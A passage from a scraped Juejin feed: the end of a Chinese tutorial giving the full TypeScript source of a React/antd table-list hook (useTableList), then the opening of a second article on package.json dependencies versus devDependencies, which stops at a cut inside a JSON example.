  <span class="hljs-attr">sortOrder</span>: [<span class="hljs-string">'ASC'</span>, <span class="hljs-string">'DESC'</span>]
})
</code></pre>
<hr/>
<h2 data-id="heading-9">五、核心实现思路</h2>
<h3 data-id="heading-10">1️⃣ 单一数据入口</h3>
<p>所有行为最终都会走：</p>
<ul>
<li>search</li>
<li>refresh</li>
<li>reset</li>
<li>表格分页 / 排序</li>
</ul>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-keyword">const</span> <span class="hljs-title function_">fetchList</span> = <span class="hljs-keyword">async</span> (<span class="hljs-params">params</span>) =&gt; { ... }
</code></pre>
<p>这是整个 Hook 稳定性的核心。</p>
<hr/>
<h3 data-id="heading-11">2️⃣ 查询参数是唯一真相</h3>
<p>分页、排序、条件都收敛在 queryParams 中，避免状态割裂。</p>
<hr/>
<h3 data-id="heading-12">3️⃣ 表格行为完全内聚</h3>
<pre><code class="hljs language-ts" lang="ts">onTableChange =&gt; <span class="hljs-title function_">fetchList</span>()
</code></pre>
<p>页面层不再处理分页 / 排序细节。</p>
<hr/>
<h3 data-id="heading-13">4️⃣ rowSelection 统一托管</h3>
<p>让批量操作天然可扩展。</p>
<hr/>
<h2 data-id="heading-14">六、完整源码（useTableList.ts）</h2>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-keyword">import</span> {  <span class="hljs-keyword">type</span> <span class="hljs-title class_">Key</span>, <span class="hljs-keyword">type</span> <span class="hljs-title class_">ReactNode</span>, useState, useEffect, useCallback, useRef, useMemo } <span class="hljs-keyword">from</span> <span class="hljs-string">'react'</span>
<span class="hljs-keyword">import</span> { <span class="hljs-title class_">Empty</span>, <span class="hljs-keyword">type</span> <span class="hljs-title class_">TableProps</span> <span class="hljs-keyword">as</span> <span class="hljs-title class_">AntdTableProps</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">'antd'</span>
<span class="hljs-keyword">import</span> <span class="hljs-keyword">type</span> {
  <span class="hljs-title class_">TablePaginationConfig</span>,
  <span class="hljs-title class_">TableCurrentDataSource</span>
} <span class="hljs-keyword">from</span> <span class="hljs-string">'antd/es/table/interface'</span>

<span class="hljs-keyword">export</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">QueryParamsData</span> {
  <span class="hljs-attr">pageNo</span>: <span class="hljs-built_in">number</span>
  <span class="hljs-attr">pageSize</span>: <span class="hljs-built_in">number</span>
  orderType?: <span class="hljs-built_in">string</span>
  orderField?: <span class="hljs-built_in">string</span>
  [<span class="hljs-attr">key</span>: <span class="hljs-built_in">string</span>]: <span class="hljs-built_in">any</span>
}

<span class="hljs-keyword">interface</span> <span class="hljs-title class_">TableResponse</span>&lt;T&gt; {
  <span class="hljs-attr">status</span>: <span class="hljs-built_in">string</span>
  <span class="hljs-attr">data</span>: {
    <span class="hljs-attr">list</span>: T[]
    <span class="hljs-attr">totalCount</span>: <span class="hljs-built_in">number</span>
  }
}

<span class="hljs-keyword">interface</span> <span class="hljs-title class_">TableState</span>&lt;T&gt; {
  <span class="hljs-attr">pagination</span>: <span class="hljs-title class_">TablePaginationConfig</span>
  <span class="hljs-attr">list</span>: T[]
  <span class="hljs-attr">queryParams</span>: <span class="hljs-title class_">QueryParamsData</span>
}

<span class="hljs-keyword">export</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">TableProps</span>&lt;T&gt; {
  <span class="hljs-attr">bordered</span>: <span class="hljs-built_in">boolean</span>
  <span class="hljs-attr">size</span>: <span class="hljs-string">'middle'</span>
  <span class="hljs-attr">sticky</span>: <span class="hljs-built_in">boolean</span>
  <span class="hljs-attr">rowSelection</span>: <span class="hljs-title class_">AntdTableProps</span>&lt;T&gt;[<span class="hljs-string">'rowSelection'</span>] | <span class="hljs-literal">undefined</span>
  <span class="hljs-attr">pagination</span>: <span class="hljs-title class_">TablePaginationConfig</span>
  <span class="hljs-attr">loading</span>: <span class="hljs-built_in">boolean</span>
  <span class="hljs-attr">dataSource</span>: T[]
  <span class="hljs-attr">onChange</span>: <span class="hljs-title class_">AntdTableProps</span>&lt;T&gt;[<span class="hljs-string">'onChange'</span>]
  <span class="hljs-attr">locale</span>: {
    <span class="hljs-attr">emptyText</span>: <span class="hljs-built_in">string</span> | <span class="hljs-title class_">ReactNode</span>
  }
}

<span class="hljs-keyword">interface</span> <span class="hljs-title class_">TableListResult</span>&lt;T&gt; {
  <span class="hljs-comment">/** 查询参数 */</span>
  <span class="hljs-attr">queryParams</span>: <span class="hljs-title class_">QueryParamsData</span>
  <span class="hljs-comment">/** 执行查询方法 */</span>
  <span class="hljs-attr">search</span>: <span class="hljs-function">(<span class="hljs-params">params?: Record&lt;<span class="hljs-built_in">string</span>, <span class="hljs-built_in">any</span>&gt;</span>) =&gt;</span> <span class="hljs-built_in">void</span>
  <span class="hljs-attr">refresh</span>: <span class="hljs-function">(<span class="hljs-params">params?: Record&lt;<span class="hljs-built_in">string</span>, <span class="hljs-built_in">any</span>&gt;</span>) =&gt;</span> <span class="hljs-built_in">void</span>
  <span class="hljs-attr">reset</span>: <span class="hljs-function">(<span class="hljs-params">params?: Record&lt;<span class="hljs-built_in">string</span>, <span class="hljs-built_in">any</span>&gt;</span>) =&gt;</span> <span class="hljs-built_in">void</span>
  <span class="hljs-comment">/** 选中的行 keys */</span>
  <span class="hljs-attr">selectedRowKeys</span>: <span class="hljs-title class_">Key</span>[]
  <span class="hljs-comment">/** 表格属性 */</span>
  <span class="hljs-attr">tableProps</span>: <span class="hljs-title class_">TableProps</span>&lt;T&gt;
}

<span class="hljs-keyword">interface</span> <span class="hljs-title class_">GlobalTableConfig</span> {
  <span class="hljs-attr">sortField</span>: <span class="hljs-built_in">string</span>[]
  <span class="hljs-attr">sortOrder</span>: <span class="hljs-built_in">string</span>[]
  <span class="hljs-attr">pageSize</span>: <span class="hljs-built_in">number</span>
}

<span class="hljs-comment">// 默认配置</span>
<span class="hljs-keyword">const</span> <span class="hljs-attr">globalTableConfig</span>: <span class="hljs-title class_">GlobalTableConfig</span> = {
  <span class="hljs-attr">sortField</span>: [<span class="hljs-string">'orderType'</span>, <span class="hljs-string">'orderField'</span>],
  <span class="hljs-attr">sortOrder</span>: [<span class="hljs-string">'ASC'</span>, <span class="hljs-string">'DESC'</span>],
  <span class="hljs-attr">pageSize</span>: <span class="hljs-number">10</span>
}

<span class="hljs-comment">/**
 * 配置全局表格参数
 * <span class="hljs-doctag">@param</span> <span class="hljs-variable">config</span>
 */</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">configureTableOption</span>(<span class="hljs-params">config: GlobalTableConfig</span>): <span class="hljs-built_in">void</span> {
  <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">keys</span>(config).<span class="hljs-title function_">forEach</span>(<span class="hljs-function">(<span class="hljs-params">key: <span class="hljs-built_in">string</span></span>) =&gt;</span> {
    globalTableConfig[key] = config[key]
  })
}

<span class="hljs-keyword">export</span> <span class="hljs-keyword">function</span> useTableList&lt;T <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Record</span>&lt;<span class="hljs-built_in">string</span>, <span class="hljs-built_in">any</span>&gt; = <span class="hljs-title class_">Record</span>&lt;<span class="hljs-built_in">string</span>, <span class="hljs-built_in">any</span>&gt;&gt;(
  <span class="hljs-attr">getRequestFn</span>: <span class="hljs-function">(<span class="hljs-params">data: QueryParamsData</span>) =&gt;</span> <span class="hljs-title class_">Promise</span>&lt;<span class="hljs-title class_">TableResponse</span>&lt;T&gt;&gt;,
  initParams = {} <span class="hljs-keyword">as</span> <span class="hljs-title class_">Record</span>&lt;<span class="hljs-built_in">string</span>, <span class="hljs-built_in">any</span>&gt;
): <span class="hljs-title class_">TableListResult</span>&lt;T&gt; {
  <span class="hljs-keyword">const</span> { rowSelection, ...restInitParams } = initParams
  <span class="hljs-keyword">const</span> <span class="hljs-variable constant_">PAGE_SIZE</span> = globalTableConfig.<span class="hljs-property">pageSize</span>

  <span class="hljs-keyword">const</span> [state, setState] = useState&lt;<span class="hljs-title class_">TableState</span>&lt;T&gt;&gt;({
    <span class="hljs-attr">pagination</span>: {
      <span class="hljs-attr">showSizeChanger</span>: <span class="hljs-literal">true</span>,
      <span class="hljs-attr">showQuickJumper</span>: <span class="hljs-literal">true</span>,
      <span class="hljs-attr">total</span>: <span class="hljs-number">0</span>,
      <span class="hljs-attr">pageSize</span>: <span class="hljs-variable constant_">PAGE_SIZE</span>,
      <span class="hljs-attr">current</span>: <span class="hljs-number">1</span>
    },
    <span class="hljs-attr">list</span>: [],
    <span class="hljs-attr">queryParams</span>: {
      <span class="hljs-attr">pageNo</span>: <span class="hljs-number">1</span>,
      <span class="hljs-attr">pageSize</span>: <span class="hljs-variable constant_">PAGE_SIZE</span>,
      ...restInitParams
    }
  })

  <span class="hljs-keyword">const</span> { pagination, list, queryParams } = state
  <span class="hljs-keyword">const</span> { <span class="hljs-attr">pageNo</span>: currentPageNo, <span class="hljs-attr">pageSize</span>: currentPageSize } = queryParams

  <span class="hljs-keyword">const</span> [isLoading, setIsLoading] = <span class="hljs-title function_">useState</span>(<span class="hljs-literal">true</span>)
  <span class="hljs-keyword">const</span> initialQuery = <span class="hljs-title function_">useRef</span>(queryParams)
  <span class="hljs-keyword">const</span> [selectedRowKeys, setSelectedRowKeys] = useState&lt;<span class="hljs-title class_">Key</span>[]&gt;([])


  <span class="hljs-keyword">const</span> <span class="hljs-attr">rowSelectionData</span>: <span class="hljs-title class_">AntdTableProps</span>&lt;T&gt;[<span class="hljs-string">'rowSelection'</span>] | <span class="hljs-literal">undefined</span> = <span class="hljs-title function_">useMemo</span>(<span class="hljs-function">() =&gt;</span> {
    <span class="hljs-keyword">if</span> (!rowSelection) <span class="hljs-keyword">return</span> <span class="hljs-built_in">void</span> <span class="hljs-number">0</span>
    <span class="hljs-keyword">return</span> {
      selectedRowKeys,
      <span class="hljs-attr">onChange</span>: <span class="hljs-function">(<span class="hljs-params">keys: Key[]</span>) =&gt;</span> <span class="hljs-title function_">setSelectedRowKeys</span>(keys)
    }
  }, [rowSelection, selectedRowKeys])

  <span class="hljs-keyword">const</span> showTotal = <span class="hljs-title function_">useCallback</span>(
    (<span class="hljs-attr">total</span>: <span class="hljs-built_in">number</span>): <span class="hljs-function"><span class="hljs-params">string</span> =&gt;</span> {
      <span class="hljs-keyword">return</span> <span class="hljs-string">`共 <span class="hljs-subst">${total}</span> 条记录 第 <span class="hljs-subst">${currentPageNo}</span>/<span class="hljs-subst">${<span class="hljs-built_in">Math</span>.ceil(total / currentPageSize)}</span> 页 `</span>
    },
    [currentPageNo, currentPageSize]
  )

  <span class="hljs-keyword">const</span> fetchList = <span class="hljs-title function_">useCallback</span>(
    <span class="hljs-keyword">async</span> (<span class="hljs-attr">params</span>: <span class="hljs-title class_">QueryParamsData</span>): <span class="hljs-title class_">Promise</span>&lt;<span class="hljs-built_in">void</span>&gt; =&gt; {
      <span class="hljs-keyword">const</span> { pageNo } = params
      <span class="hljs-title function_">setIsLoading</span>(<span class="hljs-literal">true</span>)
      <span class="hljs-keyword">const</span> queryParamsData = { ...restInitParams, <span class="hljs-attr">pageSize</span>: currentPageSize, ...params }
      <span class="hljs-keyword">if</span> (params.<span class="hljs-property">pageNo</span> === <span class="hljs-built_in">void</span> <span class="hljs-number">0</span>) {
        queryParamsData.<span class="hljs-property">pageNo</span> = <span class="hljs-number">1</span>
      }
      <span class="hljs-keyword">if</span> (params.<span class="hljs-property">pageSize</span> === <span class="hljs-built_in">void</span> <span class="hljs-number">0</span>) {
        queryParamsData.<span class="hljs-property">pageSize</span> = currentPageSize
      }
      <span class="hljs-keyword">const</span> { data } = <span class="hljs-keyword">await</span> <span class="hljs-title function_">getRequestFn</span>(queryParamsData)
      <span class="hljs-keyword">const</span> { list = [], totalCount = <span class="hljs-number">0</span> } = data || {}
      rowSelection &amp;&amp; <span class="hljs-title function_">setSelectedRowKeys</span>([])
      <span class="hljs-title function_">setState</span>({
        list,
        <span class="hljs-attr">queryParams</span>: queryParamsData <span class="hljs-keyword">as</span> T &amp; <span class="hljs-title class_">QueryParamsData</span>,
        <span class="hljs-attr">pagination</span>: {
          ...pagination,
          <span class="hljs-attr">current</span>: pageNo,
          <span class="hljs-attr">pageSize</span>: queryParamsData.<span class="hljs-property">pageSize</span>,
          <span class="hljs-attr">total</span>: totalCount
        }
      })

      <span class="hljs-title function_">setIsLoading</span>(<span class="hljs-literal">false</span>)
    },
    [queryParams, restInitParams, rowSelection, currentPageSize, getRequestFn, pagination]
  )

  <span class="hljs-keyword">const</span> search = <span class="hljs-title function_">useCallback</span>(
    <span class="hljs-function">(<span class="hljs-params">params?: Record&lt;<span class="hljs-built_in">string</span>, <span class="hljs-built_in">any</span>&gt;</span>) =&gt;</span> {
      <span class="hljs-title function_">fetchList</span>({ ...queryParams, ...params, <span class="hljs-attr">pageNo</span>: <span class="hljs-number">1</span> })
    },
    [fetchList, queryParams]
  )

  <span class="hljs-keyword">const</span> refresh = <span class="hljs-title function_">useCallback</span>(
    <span class="hljs-function">(<span class="hljs-params">params?: Record&lt;<span class="hljs-built_in">string</span>, <span class="hljs-built_in">any</span>&gt;</span>) =&gt;</span> {
      <span class="hljs-title function_">fetchList</span>({ ...queryParams, ...params})
    },
    [fetchList, queryParams]
  )

  <span class="hljs-keyword">const</span> reset = <span class="hljs-title function_">useCallback</span>(
    <span class="hljs-function">(<span class="hljs-params">params?: Record&lt;<span class="hljs-built_in">string</span>, <span class="hljs-built_in">any</span>&gt;</span>) =&gt;</span> {
      <span class="hljs-title function_">fetchList</span>({ ...params, <span class="hljs-attr">pageSize</span>: currentPageSize, <span class="hljs-attr">pageNo</span>: <span class="hljs-number">1</span> })
    },
    [fetchList, currentPageSize]
  )

  <span class="hljs-keyword">const</span> onTableChange = <span class="hljs-title function_">useCallback</span>(
    <span class="hljs-function">(<span class="hljs-params"> pagination: TablePaginationConfig,
      _filters: Record&lt;<span class="hljs-built_in">string</span>, <span class="hljs-built_in">any</span>&gt;,
      sorter: Record&lt;<span class="hljs-built_in">string</span>, <span class="hljs-built_in">any</span>&gt;,
      extra: TableCurrentDataSource&lt;<span class="hljs-built_in">any</span>&gt;</span>) =&gt;</span> {
      <span class="hljs-keyword">const</span> { action } = extra
      <span class="hljs-keyword">if</span> ([<span class="hljs-string">'paginate'</span>, <span class="hljs-string">'sort'</span>].<span class="hljs-title function_">includes</span>(action)) {
        <span class="hljs-keyword">const</span> { current, pageSize } = pagination
        <span class="hljs-keyword">const</span> { field, order } = sorter
        <span class="hljs-keyword">const</span> [orderTypeField, orderFieldName] = globalTableConfig.<span class="hljs-property">sortField</span>
        <span class="hljs-keyword">const</span> [ascValue, descValue] = globalTableConfig.<span class="hljs-property">sortOrder</span>
        <span class="hljs-keyword">const</span> params = {
          ...queryParams,
          [orderTypeField]: order ? (order === <span class="hljs-string">'ascend'</span> ? ascValue : descValue) : <span class="hljs-built_in">void</span> <span class="hljs-number">0</span>,
          [orderFieldName]: field,
          <span class="hljs-attr">pageNo</span>: current,
          <span class="hljs-attr">pageSize</span>: pageSize
        }
        <span class="hljs-title function_">fetchList</span>(params)
      }
    },
    [queryParams, fetchList]
  )

  <span class="hljs-keyword">const</span> <span class="hljs-attr">tableProps</span>: <span class="hljs-title class_">TableProps</span>&lt;T&gt; = <span class="hljs-title function_">useMemo</span>(<span class="hljs-function">() =&gt;</span> {
    <span class="hljs-keyword">return</span> {
      <span class="hljs-attr">bordered</span>: <span class="hljs-literal">true</span>,
      <span class="hljs-attr">size</span>: <span class="hljs-string">'middle'</span>,
      <span class="hljs-attr">sticky</span>: <span class="hljs-literal">true</span>,
      <span class="hljs-attr">rowSelection</span>: rowSelectionData,
      <span class="hljs-attr">pagination</span>: { ...pagination, showTotal },
      <span class="hljs-attr">loading</span>: isLoading,
      <span class="hljs-attr">dataSource</span>: list,
      <span class="hljs-attr">onChange</span>: onTableChange,
      <span class="hljs-attr">locale</span>: {
        <span class="hljs-attr">emptyText</span>: isLoading ? <span class="hljs-string">''</span> : <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">Empty</span> <span class="hljs-attr">image</span>=<span class="hljs-string">{Empty.PRESENTED_IMAGE_SIMPLE}</span> /&gt;</span></span>
      }
    }
  }, [rowSelectionData, pagination, showTotal, isLoading, list, onTableChange])

  <span class="hljs-title function_">useEffect</span>(<span class="hljs-function">() =&gt;</span> {
    <span class="hljs-title function_">search</span>(initialQuery.<span class="hljs-property">current</span>)
  }, [])

  <span class="hljs-keyword">return</span> {
    queryParams,
    search,
    refresh,
    reset,
    selectedRowKeys,
    tableProps
  }
}

</code></pre>
<hr/>
<h2 data-id="heading-15">七、页面使用示例</h2>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-keyword">const</span> { tableProps, search, reset, selectedRowKeys } = <span class="hljs-title function_">useTableList</span>(getUserList, {
  <span class="hljs-attr">rowSelection</span>: <span class="hljs-literal">true</span>
})
</code></pre>
<pre><code class="hljs language-tsx" lang="tsx">&lt;<span class="hljs-title class_">Form</span> onFinish={search}&gt;
  <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">Button</span> <span class="hljs-attr">htmlType</span>=<span class="hljs-string">"submit"</span>&gt;</span>搜索<span class="hljs-tag">&lt;/<span class="hljs-name">Button</span>&gt;</span></span>
  <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">Button</span> <span class="hljs-attr">onClick</span>=<span class="hljs-string">{reset}</span>&gt;</span>重置<span class="hljs-tag">&lt;/<span class="hljs-name">Button</span>&gt;</span></span>
&lt;/<span class="hljs-title class_">Form</span>&gt;

<span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">Table</span> <span class="hljs-attr">rowKey</span>=<span class="hljs-string">"id"</span> <span class="hljs-attr">columns</span>=<span class="hljs-string">{columns}</span> {<span class="hljs-attr">...tableProps</span>} /&gt;</span></span>
</code></pre>
<hr/>
<h2 data-id="heading-16">八、总结</h2>
<p>useTableList 带来的不是“少写几行代码”，而是：</p>
<ul>
<li>列表页工程化</li>
<li>行为模型统一</li>
<li>Bug 集中收口</li>
<li>可持续扩展</li>
</ul>
<p>非常适合作为中后台项目的基础设施。</p>
<hr/>
<h2 data-id="heading-17">九、后续可进阶方向</h2>
<ul>
<li>URL 同步查询参数</li>
<li>导出 / 批量操作能力</li>
<li>自动轮询 / 缓存</li>
<li>向 ProTable 形态演进</li>
</ul>
<hr/>
<p>如果这篇文章对你有帮助，欢迎点赞 / 收藏 / 评论交流 👏
也欢迎分享你们项目中是如何封装列表页的。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[package.json 中的 dependencies 与 devDependencies：深度解析]]></title>    <link>https://juejin.cn/post/7592615536384966690</link>    <guid>https://juejin.cn/post/7592615536384966690</guid>    <pubDate>2026-01-08T09:42:46.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7592615536384966690" data-draft-id="7592787377656283170" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="package.json 中的 dependencies 与 devDependencies：深度解析"/> <meta itemprop="keywords" content="前端,前端框架,设计模式"/> <meta itemprop="datePublished" content="2026-01-08T09:42:46.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="大知闲闲i"/> <meta itemprop="url" content="https://juejin.cn/user/3799545205237111"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            package.json 中的 dependencies 与 devDependencies：深度解析
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3799545205237111/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    大知闲闲i
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-08T09:42:46.000Z" title="Thu Jan 08 2026 09:42:46 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-08
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读1分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">核心区别概述</h2>
<p>在 Node.js 和前端项目中，<code>package.json</code> 文件是项目的"身份证"和"配置清单"，其中的 <code>dependencies</code>（生产依赖）和 <code>devDependencies</code>（开发依赖）是管理项目依赖的两大核心字段。它们虽然都用来声明项目所需的软件包，但在使用场景、安装方式和部署策略上有着本质区别。</p>
<h2 data-id="heading-1">📦 dependencies：生产环境依赖</h2>
<h3 data-id="heading-2">定义与作用</h3>
<p><code>dependencies</code> 包含了项目在生产环境中运行所必需的依赖包。这些是项目代码<strong>运行时真正需要</strong>的库和框架。</p>
<h3 data-id="heading-3">典型包含内容</h3>
<ul>
<li>
<p><strong>运行时库</strong>：如 React、Vue、Angular 等前端框架</p>
</li>
<li>
<p><strong>工具库</strong>：如 lodash、axios、moment 等通用工具</p>
</li>
<li>
<p><strong>服务端框架</strong>：如 Express、Koa、NestJS</p>
</li>
<li>
<p><strong>数据库驱动</strong>：如 mongoose、sequelize、mysql2</p>
</li>
<li>
<p><strong>其他核心依赖</strong>：任何项目运行不可或缺的第三方包</p>
</li>
</ul>
<h3 data-id="heading-4">安装与使用</h3>
<pre><code class="hljs language-perl" lang="perl"><span class="hljs-comment"># 安装到 dependencies</span>
npm install &lt;<span class="hljs-keyword">package</span>-name&gt; --save
<span class="hljs-comment"># 或简写</span>
npm install &lt;<span class="hljs-keyword">package</span>-name&gt;
<span class="hljs-comment"># yarn 等价命令</span>
yarn add &lt;<span class="hljs-keyword">package</span>-name&gt;
</code></pre>
<h3 data-id="heading-5">部署影响</h3>
<p>这些依赖<strong>会被打包</strong>并部署到生产环境，用户最终下载的代码包中包含这些依赖。</p>
<h2 data-id="heading-6">🔧 devDependencies：开发环境依赖</h2>
<h3 data-id="heading-7">定义与作用</h3>
<p><code>devDependencies</code> 包含了仅在开发、构建、测试等阶段需要的工具和库。项目<strong>运行时并不需要</strong>这些依赖。</p>
<h3 data-id="heading-8">典型包含内容</h3>
<ul>
<li>
<p><strong>构建工具</strong>：Webpack、Vite、Rollup</p>
</li>
<li>
<p><strong>代码质量工具</strong>：ESLint、Prettier、Stylelint</p>
</li>
<li>
<p><strong>测试框架</strong>：Jest、Mocha、Cypress</p>
</li>
<li>
<p><strong>类型检查</strong>：TypeScript、Flow</p>
</li>
<li>
<p><strong>开发服务器</strong>：nodemon、webpack-dev-server</p>
</li>
<li>
<p><strong>文档工具</strong>：JSDoc、VuePress</p>
</li>
<li>
<p><strong>其他开发工具</strong>：如代码生成器、构建脚本等</p>
</li>
</ul>
<h3 data-id="heading-9">安装与使用</h3>
<pre><code class="hljs language-perl" lang="perl"><span class="hljs-comment"># 安装到 devDependencies</span>
npm install &lt;<span class="hljs-keyword">package</span>-name&gt; --save-dev
<span class="hljs-comment"># 简写</span>
npm install &lt;<span class="hljs-keyword">package</span>-name&gt; -D
<span class="hljs-comment"># yarn 等价命令</span>
yarn add &lt;<span class="hljs-keyword">package</span>-name&gt; --dev
</code></pre>
<h3 data-id="heading-10">部署影响</h3>
<p>这些依赖<strong>不会被打包</strong>到生产环境，最终用户不会下载这些代码，减少了生产包体积。</p>
<h2 data-id="heading-11">🔍 详细对比表格</h2>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d6a377572ce24ed28a7019b6f3e0a498~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aSn55-l6Zey6ZeyaQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768470165&amp;x-signature=UQHSX3YNz7ldt61b0AvVWZTTIuc%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-12">🛠️ 使用场景示例</h2>
<h3 data-id="heading-13">package.json 示例</h3>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
